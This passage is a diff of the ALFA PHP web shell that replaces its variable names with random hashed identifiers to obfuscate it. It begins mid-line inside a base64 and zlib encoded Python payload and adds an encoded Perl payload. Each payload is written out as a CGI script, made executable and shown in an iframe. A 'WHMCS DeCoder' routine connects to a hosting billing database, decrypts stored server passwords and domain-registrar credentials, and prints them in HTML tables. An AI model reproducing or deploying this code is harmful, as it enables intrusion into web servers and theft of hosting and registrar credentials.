G0hlOf4xje7LoJn5RJbkJ8hDt0m5YU9bzZ7L+2bU1DWDQZ5OMEudphc6z3GGTw/Npbr0YCz1UVSfNBPJ6wTMl/Ni+UUhe5XaiG2qjBj9UII3wfNlAUGKUxF/WtAEZrygtYlBIjMR4PDHTQuttG7RPjpCQIK7Wr2F3XjUO4TVGwqEQEHZK9gwtth9ksnSuhXiiJA2k5vt4a7jBGjj4NCPc6dAA3a0KKOBDvEDx52HEOCrWnsIbm8IDT/D727xqyxb4S2QtTYbWNBGuKwlqkHEbTjcYkNIHiIo8gcDbPfZ1wvwTgLcYfaCAMiNEHQDz9gdqy6cV4gwOhlPTrdk9W5xjVMvEVDOhPZgwoQNu26Pkn99N6T7+MF1KpxEQoNeonoB1BYrSVVg0wIeZRXHoixR+GaI66d/GpFL909qeAkIY5w3PUM4dY7q5XCbAR60XSnrJXfffc2u2z0sxPPB59i2ZkZNejYpPioOFOA8cp0OXg1a+am5oDaV4FV3GMKIxibFF9ZUYtaCpL8DySTcg0q+WNwGKbTuJ3fPh+5pAXdBr15xe8Ft8OyAcQ2MrGZhpUQZs0KEQuEb4ZcPV1DdBfQGCHcbu9vtzvZY/zFqvqOmBJMXKhWmgoDWBnPo/c8frylhMfp1AUHfvfsg+Mu52zGI2zGo3/waHpwSrwXdX35xGfY7ey8ge/QYH0rATxTi2rCJKdmX4v3ZgJuT79+vxluhyyVdfqXgoTBr/32RU+oVACu0ijOJbQsCGWuVSJPD8D03gmx0BYkOH99AMOtoApEL7uwZk5nUj1DX8WZbnX7QOfQ/HBUmxza4y8xDSbgbu38mGf+P2AOSd0wOL2cJq7B1mg44s+wPJ4TfVROcnHVXMPiYwBmEjt0+H9APzcPJLbZ70bpINbznCXO9BvckhzEfOe5NPtSzqVma3dbmw7eVjFFMcdh9aaHa6oRrlYT5bX64fvfjwjnItcOb8d0QMYC7dxDebmvFfdf5d7Ytif303E+4Oh28ln+xiL5AxD6X4FNut2jtMm7kdi6c/LB94iqKz8jgv11NVZo=")),\'<string>\',\'exec\'))';
-if($_POST['alfa1']=='perl'){$code = $perl;}else{$code = $py;}
-if(__write_file($name,$code)){
-@chmod($name,0755);
-echo '<iframe src="'.__ALFA_DATA_FOLDER__.'/cgialfa/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
+$kkkpgnftb068931cc450442b63f5b3d276ea4297 = $_POST['alfa1'].'.alfa';
+$pxmkwegbf83a0aa1f9ca0f7dd5994445ba7d9e80 = '#!/usr/bin/perl   -I/usr/local/bandmin'."\n".'use MIME::Base64;use Compress::Zlib;eval(Compress::Zlib::memGunzip(decode_base64("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")));';;
+$jbyuabyldfed5bc177b87ab317c584e06566adc6 = '#!/usr/bin/python'."\nimport zlib, base64\n".'eval(compile(zlib.decompress(base64.b64decode("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")),\'<string>\',\'exec\'))';
+if($_POST['alfa1']=='perl'){$nndigmblc13367945d5d4c91047b3b50234aa7ab = $pxmkwegbf83a0aa1f9ca0f7dd5994445ba7d9e80;}else{$nndigmblc13367945d5d4c91047b3b50234aa7ab = $jbyuabyldfed5bc177b87ab317c584e06566adc6;}
+if(__write_file($kkkpgnftb068931cc450442b63f5b3d276ea4297,$nndigmblc13367945d5d4c91047b3b50234aa7ab)){
+@chmod($kkkpgnftb068931cc450442b63f5b3d276ea4297,0755);
+echo '<iframe src="'.__ALFA_DATA_FOLDER__.'/cgialfa/'.$kkkpgnftb068931cc450442b63f5b3d276ea4297.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
 }
 }
-echo $div;
+echo $sqznsikw38696558dc98494c08d951c052900a2a;
 alfafooter();
 }
 function alfaWhmcs(){
 alfahead();
 echo '<div class=header>';
-function decrypt($string,$cc_encryption_hash){
-$key = md5 (md5 ($cc_encryption_hash)) . md5 ($cc_encryption_hash);
-$hash_key = _hash($key);
-$hash_length = strlen ($hash_key);
-$string = __ZGVjb2Rlcg($string);
-$tmp_iv = substr ($string, 0, $hash_length);
-$string = substr ($string, $hash_length, strlen ($string) - $hash_length);
-$iv = $out = '';
-$c = 0;
-while ($c < $hash_length)
+function decrypt($syvgjxtsb45cffe084dd3d20d928bee85e7b0f21,$dnhhacaie8bd59452f341502dc3614d3e30ca4d3){
+$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d = md5 (md5 ($dnhhacaie8bd59452f341502dc3614d3e30ca4d3)) . md5 ($dnhhacaie8bd59452f341502dc3614d3e30ca4d3);
+$vmzgewrw191afdc6eb59e8dc47de536bbf23f199 = _hash($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d);
+$jeplkfmp219696c345c0a93403933a08c81b6fac = strlen ($vmzgewrw191afdc6eb59e8dc47de536bbf23f199);
+$syvgjxtsb45cffe084dd3d20d928bee85e7b0f21 = __ZGVjb2Rlcg($syvgjxtsb45cffe084dd3d20d928bee85e7b0f21);
+$ozdsbxfifce516bd723883202dc5cf36a84a96a2 = substr ($syvgjxtsb45cffe084dd3d20d928bee85e7b0f21, 0, $jeplkfmp219696c345c0a93403933a08c81b6fac);
+$syvgjxtsb45cffe084dd3d20d928bee85e7b0f21 = substr ($syvgjxtsb45cffe084dd3d20d928bee85e7b0f21, $jeplkfmp219696c345c0a93403933a08c81b6fac, strlen ($syvgjxtsb45cffe084dd3d20d928bee85e7b0f21) - $jeplkfmp219696c345c0a93403933a08c81b6fac);
+$nxtodlobf0b53b2da041fca49ef0b9839060b345 = $vemvtkqkc68271a63ddbc431c307beb7d2918275 = '';
+$yyphbkaj4a8a08f09d37b73795649038408b5f33 = 0;
+while ($yyphbkaj4a8a08f09d37b73795649038408b5f33 < $jeplkfmp219696c345c0a93403933a08c81b6fac)
 {
-$iv .= chr (ord ($tmp_iv[$c]) ^ ord ($hash_key[$c]));
-++$c;
+$nxtodlobf0b53b2da041fca49ef0b9839060b345 .= chr (ord ($ozdsbxfifce516bd723883202dc5cf36a84a96a2[$yyphbkaj4a8a08f09d37b73795649038408b5f33]) ^ ord ($vmzgewrw191afdc6eb59e8dc47de536bbf23f199[$yyphbkaj4a8a08f09d37b73795649038408b5f33]));
+++$yyphbkaj4a8a08f09d37b73795649038408b5f33;
 }
-$key = $iv;
-$c = 0;
-while ($c < strlen ($string))
+$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d = $nxtodlobf0b53b2da041fca49ef0b9839060b345;
+$yyphbkaj4a8a08f09d37b73795649038408b5f33 = 0;
+while ($yyphbkaj4a8a08f09d37b73795649038408b5f33 < strlen ($syvgjxtsb45cffe084dd3d20d928bee85e7b0f21))
 {
-if (($c != 0 AND $c % $hash_length == 0))
+if (($yyphbkaj4a8a08f09d37b73795649038408b5f33 != 0 AND $yyphbkaj4a8a08f09d37b73795649038408b5f33 % $jeplkfmp219696c345c0a93403933a08c81b6fac == 0))
 {
-$key = _hash ($key . substr ($out, $c - $hash_length, $hash_length));
+$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d = _hash ($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d . substr ($vemvtkqkc68271a63ddbc431c307beb7d2918275, $yyphbkaj4a8a08f09d37b73795649038408b5f33 - $jeplkfmp219696c345c0a93403933a08c81b6fac, $jeplkfmp219696c345c0a93403933a08c81b6fac));
 }
-$out .= chr (ord ($key[$c % $hash_length]) ^ ord ($string[$c]));
-++$c;
+$vemvtkqkc68271a63ddbc431c307beb7d2918275 .= chr (ord ($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d[$yyphbkaj4a8a08f09d37b73795649038408b5f33 % $jeplkfmp219696c345c0a93403933a08c81b6fac]) ^ ord ($syvgjxtsb45cffe084dd3d20d928bee85e7b0f21[$yyphbkaj4a8a08f09d37b73795649038408b5f33]));
+++$yyphbkaj4a8a08f09d37b73795649038408b5f33;
 }
-return $out;
+return $vemvtkqkc68271a63ddbc431c307beb7d2918275;
 }
-function _hash($string)
+function _hash($syvgjxtsb45cffe084dd3d20d928bee85e7b0f21)
 {
 if(function_exists('sha1'))
 {
-$hash = sha1 ($string);
+$horyspio0800fc577294c34e0b28ad2839435945 = sha1 ($syvgjxtsb45cffe084dd3d20d928bee85e7b0f21);
 }
 else
 {
-$hash = md5 ($string);
+$horyspio0800fc577294c34e0b28ad2839435945 = md5 ($syvgjxtsb45cffe084dd3d20d928bee85e7b0f21);
 }
-$out = '';
-$c = 0;
-while ($c < strlen ($hash))
+$vemvtkqkc68271a63ddbc431c307beb7d2918275 = '';
+$yyphbkaj4a8a08f09d37b73795649038408b5f33 = 0;
+while ($yyphbkaj4a8a08f09d37b73795649038408b5f33 < strlen ($horyspio0800fc577294c34e0b28ad2839435945))
 {
-$out .= chr (hexdec ($hash[$c] . $hash[$c + 1]));
-$c += 2;
+$vemvtkqkc68271a63ddbc431c307beb7d2918275 .= chr (hexdec ($horyspio0800fc577294c34e0b28ad2839435945[$yyphbkaj4a8a08f09d37b73795649038408b5f33] . $horyspio0800fc577294c34e0b28ad2839435945[$yyphbkaj4a8a08f09d37b73795649038408b5f33 + 1]));
+$yyphbkaj4a8a08f09d37b73795649038408b5f33 += 2;
 }
-return $out;
+return $vemvtkqkc68271a63ddbc431c307beb7d2918275;
 }
 AlfaNum(8,9,10);
 echo "<center><br><div class='txtfont_header'>| WHMCS DeCoder |</div><p>".getConfigHtml('whmcs')."</p><form onsubmit=\"g('Whmcs',null,this.form_action.value,'decoder',this.db_username.value,this.db_password.value,this.db_name.value,this.cc_encryption_hash.value,this.db_host.value); return false;\">
 <input type='hidden' name='form_action' value='2'>";
-$table = array('td1' =>
+$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
  array('color' => 'FFFFFF', 'tdName' => 'db_host : ', 'inputName' => 'db_host', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
  'td2' =>
  array('color' => 'FFFFFF', 'tdName' => 'db_username : ', 'inputName' => 'db_username', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'),
@@ -5132,51 +5205,51 @@ $table = array('td1' =>
  'td5' =>
  array('color' => 'FFFFFF', 'tdName' => 'cc_encryption_hash : ', 'inputName' => 'cc_encryption_hash', 'id' => 'cc_encryption_hash', 'inputValue' => '', 'inputSize' => '50')
 );
-create_table($table);
+create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
 echo "<p><input type='submit' value=' ' name='Submit'></p></form></center>";
 if($_POST['alfa5']!=''){
-$db_host=($_POST['alfa7']);
-$db_username=($_POST['alfa3']);
-$db_password=($_POST['alfa4']);
-$db_name=($_POST['alfa5']);
-$cc_encryption_hash=($_POST['alfa6']);
+$flhxoaev16a6214c4ae59965ca206d04f2b97f78=($_POST['alfa7']);
+$woocdhun14b96808ee87870330b7c2d4f942993d=($_POST['alfa3']);
+$rggyojaad4982f060b2fa15dc12996ce9cd5f310=($_POST['alfa4']);
+$nksstcaw24e8d17701309eab9a46949f1eab03b1=($_POST['alfa5']);
+$dnhhacaie8bd59452f341502dc3614d3e30ca4d3=($_POST['alfa6']);
 echo __pre();
-$conn=@mysqli_connect($db_host,$db_username,$db_password,$db_name) or die(mysqli_error($conn));
-$query = mysqli_query($conn,"SELECT * FROM tblservers");
-$num = mysqli_num_rows($query);
-if ($num > 0){
-for($i=0; $i <=$num-1; $i++){
-$v = @mysqli_fetch_array($query);
-$ipaddress = $v['ipaddress'];
-$username = $v['username'];
-$type = $v['type'];
-$active = $v['active'];
-$hostname = $v['hostname'];
+$nyztcxgh0c1d0e2ef91d68bdb15eff954448b898=@mysqli_connect($flhxoaev16a6214c4ae59965ca206d04f2b97f78,$woocdhun14b96808ee87870330b7c2d4f942993d,$rggyojaad4982f060b2fa15dc12996ce9cd5f310,$nksstcaw24e8d17701309eab9a46949f1eab03b1) or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+$ciexurcd1b1cc7f086b3f074da452bc3129981eb = mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"SELECT * FROM tblservers");
+$mzomhdvt0fc3cfbc27e91ea60a787de13dae3e3c = mysqli_num_rows($ciexurcd1b1cc7f086b3f074da452bc3129981eb);
+if ($mzomhdvt0fc3cfbc27e91ea60a787de13dae3e3c > 0){
+for($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741=0; $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 <=$mzomhdvt0fc3cfbc27e91ea60a787de13dae3e3c-1; $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++){
+$hvlrcxnj9e3669d19b675bd57058fd4664205d2a = @mysqli_fetch_array($ciexurcd1b1cc7f086b3f074da452bc3129981eb);
+$xqwrqnvc59fbc8df7b0bea3a26a2fb6771ea3eee = $hvlrcxnj9e3669d19b675bd57058fd4664205d2a['ipaddress'];
+$rgusbycx14c4b06b824ec593239362517f538b29 = $hvlrcxnj9e3669d19b675bd57058fd4664205d2a['username'];
+$hcgexxko599dcce2998a6b40b1e38e8c6006cb0a = $hvlrcxnj9e3669d19b675bd57058fd4664205d2a['type'];
+$tkqmggcpc76a5e84e4bdee527e274ea30c680d79 = $hvlrcxnj9e3669d19b675bd57058fd4664205d2a['active'];
+$ytrwprxy0897acf49c7c1ea9f76efe59187aa046 = $hvlrcxnj9e3669d19b675bd57058fd4664205d2a['hostname'];
 echo("<center><table border='1'>");
-$password = decrypt ($v['password'], $cc_encryption_hash);
-echo("<tr><td><b><font color=\"#FFFFFF\">Type</font></td><td>$type</td></tr></b>");
-echo("<tr><td><b><font color=\"#FFFFFF\">Active</font></td><td>$active</td></tr></b>");
-echo("<tr><td><b><font color=\"#FFFFFF\">Hostname</font></td><td>$hostname</td></tr></b>");
-echo("<tr><td><b><font color=\"#FFFFFF\">Ip</font></td><td>$ipaddress</td></tr></b>");
-echo("<tr><td><b><font color=\"#FFFFFF\">Username</font></td><td>$username</td></tr></b>");
-echo("<tr><td><b><font color=\"#FFFFFF\">Password</font></td><td>$password</td></tr></b>");
+$oimndblx5f4dcc3b5aa765d61d8327deb882cf99 = decrypt ($hvlrcxnj9e3669d19b675bd57058fd4664205d2a['password'], $dnhhacaie8bd59452f341502dc3614d3e30ca4d3);
+echo("<tr><td><b><font color=\"#FFFFFF\">Type</font></td><td>$hcgexxko599dcce2998a6b40b1e38e8c6006cb0a</td></tr></b>");
+echo("<tr><td><b><font color=\"#FFFFFF\">Active</font></td><td>$tkqmggcpc76a5e84e4bdee527e274ea30c680d79</td></tr></b>");
+echo("<tr><td><b><font color=\"#FFFFFF\">Hostname</font></td><td>$ytrwprxy0897acf49c7c1ea9f76efe59187aa046</td></tr></b>");
+echo("<tr><td><b><font color=\"#FFFFFF\">Ip</font></td><td>$xqwrqnvc59fbc8df7b0bea3a26a2fb6771ea3eee</td></tr></b>");
+echo("<tr><td><b><font color=\"#FFFFFF\">Username</font></td><td>$rgusbycx14c4b06b824ec593239362517f538b29</td></tr></b>");
+echo("<tr><td><b><font color=\"#FFFFFF\">Password</font></td><td>$oimndblx5f4dcc3b5aa765d61d8327deb882cf99</td></tr></b>");
 echo "</table><br><br></center>";
 }
-$query1 = @mysqli_query($conn,"SELECT * FROM tblregistrars");
-$num1 = @mysqli_num_rows($query1);
-if ($num1 > 0){
-for($i=0; $i <=$num1 -1; $i++){
-$v = mysqli_fetch_array($query1);
-$registrar = $v['registrar'];
-$setting = $v['setting'];
-$value = decrypt($v['value'], $cc_encryption_hash);
-if ($value==""){
-$value=0;
+$arpygopa8b09fc98eb98edcff9700ee747064cd6 = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"SELECT * FROM tblregistrars");
+$mmqbwglzbc7150e29a3d90dbe393c3d5ecd10399 = @mysqli_num_rows($arpygopa8b09fc98eb98edcff9700ee747064cd6);
+if ($mmqbwglzbc7150e29a3d90dbe393c3d5ecd10399 > 0){
+for($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741=0; $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 <=$mmqbwglzbc7150e29a3d90dbe393c3d5ecd10399 -1; $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++){
+$hvlrcxnj9e3669d19b675bd57058fd4664205d2a = mysqli_fetch_array($arpygopa8b09fc98eb98edcff9700ee747064cd6);
+$lzimuern5940569cd1d60781f856f93235b072ee = $hvlrcxnj9e3669d19b675bd57058fd4664205d2a['registrar'];
+$eqkcybqv7dc22b2c6a992f0232345df41303f5ea = $hvlrcxnj9e3669d19b675bd57058fd4664205d2a['setting'];
+$rkptsoeg2063c1608d6e0baf80249c42e2be5804 = decrypt($hvlrcxnj9e3669d19b675bd57058fd4664205d2a['value'], $dnhhacaie8bd59452f341502dc3614d3e30ca4d3);
+if ($rkptsoeg2063c1608d6e0baf80249c42e2be5804==""){
+$rkptsoeg2063c1608d6e0baf80249c42e2be5804=0;
 }
 echo("<center>Domain Reseller <br><center>");echo("<center><table border='1'>");
-echo("<tr><td><b><font color=\"#67ABDF\">Register</font></td><td>$registrar</td></tr></b>");
-echo("<tr><td><b><font color=\"#67ABDF\">Setting</font></td><td>$setting</td></tr></b>");
-echo("<tr><td><b><font color=\"#67ABDF\">Value</font></td><td>$value</td></tr></b>");
+echo("<tr><td><b><font color=\"#67ABDF\">Register</font></td><td>$lzimuern5940569cd1d60781f856f93235b072ee</td></tr></b>");
+echo("<tr><td><b><font color=\"#67ABDF\">Setting</font></td><td>$eqkcybqv7dc22b2c6a992f0232345df41303f5ea</td></tr></b>");
